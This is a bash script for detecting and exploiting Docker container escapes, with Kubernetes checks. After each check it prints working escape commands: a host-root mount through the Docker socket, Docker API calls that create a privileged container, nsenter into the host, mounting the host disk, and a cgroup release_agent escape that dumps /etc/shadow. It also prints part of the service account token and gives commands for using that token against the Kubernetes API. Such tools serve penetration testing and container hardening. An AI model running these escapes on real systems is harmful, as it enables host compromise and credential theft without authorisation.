#!/bin/bash
# Docker Container Escape Detection & Exploitation
# MITRE ATT&CK: T1611 — Escape to Host
# Usage: ./docker_escape.sh

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}=== Container Escape Assessment ===${NC}\n"

# ── Detect Container Environment ──
echo -e "${GREEN}--- Container Detection ---${NC}\n"
IN_CONTAINER=0

if [ -f /.dockerenv ]; then
    echo -e "${YELLOW}[*] /.dockerenv exists — inside Docker container${NC}"
    IN_CONTAINER=1
fi

if grep -qE 'docker|lxc|kubepods|containerd' /proc/1/cgroup 2>/dev/null; then
    echo -e "${YELLOW}[*] Container cgroup detected${NC}"
    grep -E 'docker|lxc|kubepods|containerd' /proc/1/cgroup 2>/dev/null | head -3
    IN_CONTAINER=1
fi

if [ "$(cat /proc/1/comm 2>/dev/null)" != "systemd" ] && [ "$(cat /proc/1/comm 2>/dev/null)" != "init" ]; then
    echo -e "${YELLOW}[*] PID 1 is $(cat /proc/1/comm 2>/dev/null) — likely container${NC}"
    IN_CONTAINER=1
fi

HOSTNAME=$(hostname)
if echo "$HOSTNAME" | grep -qP '^[a-f0-9]{12}$'; then
    echo -e "${YELLOW}[*] Hostname looks like container ID: $HOSTNAME${NC}"
fi

if [ $IN_CONTAINER -eq 0 ]; then
    echo -e "${YELLOW}[*] Does not appear to be a container (checks may still be useful for K8s pods)${NC}"
fi

echo ""

# ── Docker Socket ──
echo -e "${GREEN}--- Docker Socket ---${NC}\n"
if [ -S /var/run/docker.sock ]; then
    echo -e "${RED}[!] Docker socket mounted at /var/run/docker.sock${NC}"
    echo -e "${RED}[!] FULL HOST COMPROMISE possible${NC}\n"

    echo -e "${YELLOW}Exploit — spawn privileged container with host filesystem:${NC}"
    echo '  # If docker CLI available:'
    echo '  docker run -v /:/host --rm -it alpine chroot /host bash'
    echo ''
    echo '  # If only curl available:'
    echo '  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json'
    echo '  # Create container with host mount:'
    echo '  curl -s --unix-socket /var/run/docker.sock -X POST \\'
    echo '    -H "Content-Type: application/json" \\'
    echo '    -d '\''{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}'\'' \\'
    echo '    http://localhost/containers/create'
    echo '  # Start container:'
    echo '  curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<ID>/start'
    echo '  # Exec into it:'
    echo '  curl -s --unix-socket /var/run/docker.sock -X POST \\'
    echo '    -H "Content-Type: application/json" \\'
    echo '    -d '\''{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh"],"Tty":true}'\'' \\'
    echo '    http://localhost/containers/<ID>/exec'
    echo ""
elif [ -S /run/docker.sock ]; then
    echo -e "${RED}[!] Docker socket at /run/docker.sock${NC}"
else
    echo -e "${YELLOW}[*] No Docker socket found${NC}"
fi
echo ""

# ── Privileged Mode ──
echo -e "${GREEN}--- Privileged Mode ---${NC}\n"
if ip link add dummy0 type dummy 2>/dev/null; then
    ip link delete dummy0 2>/dev/null
    echo -e "${RED}[!] Container is PRIVILEGED${NC}\n"

    echo -e "${YELLOW}Exploit 1 — nsenter to host:${NC}"
    echo '  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash'
    echo ""

    echo -e "${YELLOW}Exploit 2 — mount host filesystem:${NC}"
    echo '  fdisk -l              # find host disk'
    echo '  mkdir -p /mnt/host'
    echo '  mount /dev/sda1 /mnt/host'
    echo '  chroot /mnt/host bash'
    echo ""

    echo -e "${YELLOW}Exploit 3 — cgroup escape (notify_on_release):${NC}"
    echo '  d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))'
    echo '  mkdir -p $d/w; echo 1 >$d/w/notify_on_release'
    echo '  t=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /etc/mtab)'
    echo '  echo $t/cmd >$d/release_agent'
    echo '  echo "#!/bin/sh" > /cmd'
    echo '  echo "cat /etc/shadow > $t/shadow_dump" >> /cmd'
    echo '  chmod a+x /cmd'
    echo '  sh -c "echo 0 >$d/w/cgroup.procs"; sleep 1'
    echo '  cat /shadow_dump'
    echo ""
else
    echo -e "${YELLOW}[*] Container is NOT privileged${NC}\n"
fi

# ── Capabilities ──
echo -e "${GREEN}--- Container Capabilities ---${NC}\n"
if [ -f /proc/self/status ]; then
    CAP_EFF=$(grep CapEff /proc/self/status | awk '{print $2}')
    echo -e "${YELLOW}[*] Effective capabilities: $CAP_EFF${NC}"

    if [ "$CAP_EFF" = "0000003fffffffff" ] || [ "$CAP_EFF" = "000001ffffffffff" ]; then
        echo -e "${RED}[!] ALL capabilities — effectively privileged!${NC}"
    fi

    # Decode interesting capabilities
    CAP_DEC=$((16#$CAP_EFF))
    [ $((CAP_DEC & (1 << 21))) -ne 0 ] && echo -e "${RED}[!] CAP_SYS_ADMIN — can mount, ptrace, namespace escape${NC}"
    [ $((CAP_DEC & (1 << 19))) -ne 0 ] && echo -e "${RED}[!] CAP_SYS_PTRACE — can attach to host processes${NC}"
    [ $((CAP_DEC & (1 << 12))) -ne 0 ] && echo -e "${RED}[!] CAP_NET_ADMIN — can sniff/spoof network traffic${NC}"
    [ $((CAP_DEC & (1 << 7))) -ne 0 ] && echo -e "${RED}[!] CAP_SETUID — can become root${NC}"
    [ $((CAP_DEC & (1 << 1))) -ne 0 ] && echo -e "${RED}[!] CAP_DAC_OVERRIDE — can read/write any file${NC}"
fi
echo ""

# ── Host PID Namespace ──
echo -e "${GREEN}--- Host PID Namespace ---${NC}\n"
if [ -d /proc/1/root ] && ls /proc/1/root/etc/hostname >/dev/null 2>&1; then
    HOST_HOSTNAME=$(cat /proc/1/root/etc/hostname 2>/dev/null)
    if [ "$HOST_HOSTNAME" != "$(hostname)" ] 2>/dev/null; then
        echo -e "${RED}[!] Host PID namespace shared — can see host processes${NC}"
        echo -e "${YELLOW}[*] Host hostname: $HOST_HOSTNAME${NC}"
        echo -e "${YELLOW}Exploit: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash${NC}"
    fi
fi
echo ""

# ── Sensitive Mount Points ──
echo -e "${GREEN}--- Sensitive Mounts ---${NC}\n"
SENSITIVE_MOUNTS="/proc/sysrq-trigger /dev/mem /dev/kmem /sys/kernel/security"
mount | while read -r line; do
    SRC=$(echo "$line" | awk '{print $1}')
    DST=$(echo "$line" | awk '{print $3}')

    if echo "$DST" | grep -qE '/host|/hostfs|/mnt.*root'; then
        echo -e "${RED}[!] Host filesystem mount: $SRC on $DST${NC}"
    fi
done

for m in $SENSITIVE_MOUNTS; do
    [ -e "$m" ] && echo -e "${RED}[!] Sensitive mount available: $m${NC}"
done

# ── Kubernetes Detection ──
echo -e "\n${GREEN}--- Kubernetes ---${NC}\n"
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo -e "${RED}[!] Kubernetes service account token found${NC}"
    echo -e "${YELLOW}[*] Token:${NC}"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 100
    echo "..."
    echo ""
    echo -e "${YELLOW}Exploit — check permissions:${NC}"
    echo '  export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'
    echo '  export API=https://kubernetes.default.svc'
    echo '  # List pods:'
    echo '  curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/pods'
    echo '  # Check self permissions:'
    echo '  curl -sk -H "Authorization: Bearer $TOKEN" -X POST $API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \\'
    echo '    -H "Content-Type: application/json" -d '\''{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'\'''
fi

if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
    echo -e "${YELLOW}[*] Kubernetes API: $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT${NC}"
fi

echo -e "\n${GREEN}=== Assessment Complete ===${NC}"
